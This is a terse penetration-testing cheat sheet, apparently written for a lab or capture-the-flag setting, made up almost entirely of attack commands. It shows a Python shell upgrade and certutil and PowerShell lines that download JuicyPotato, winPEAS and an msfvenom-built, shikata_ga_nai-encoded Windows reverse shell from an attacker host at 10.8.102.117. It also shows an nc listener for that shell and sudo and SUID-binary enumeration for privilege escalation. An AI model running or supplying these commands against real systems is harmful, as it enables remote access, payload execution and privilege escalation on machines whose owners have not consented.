For spawning a shell
python -c 'import pty;pty.spawn("/bin/bash")';
python3 -c 'import pty;pty.spawn("/bin/bash")';


download from attacking to target for windows
certutil -urlcache -f http://10.8.102.117:80/JuicyPotato.exe jp.exe

or 


msfvenom --platform Windows -p windows/shell_reverse_tcp -a x86 --encoder /x86/shikata_ga_nai LHOST=10.8.102.117 LPORT=1234 -f exe -o shell.exe

powershell Invoke-WebRequest -Uri http://10.8.102.117:80/shell.exe -Outfile 'C:\Windows\Temp\shell.exe'

then create listener 
nc -lvnp 1234 


Check command that can run as sudo.
sudo -l


powershell Invoke-WebRequest -Uri http://10.8.102.117:80/winpeas.bat -Outfile 'C:\Windows\Temp\winpeas.bat'



find / -perm +6000 2>/dev/null | grep '/bin/'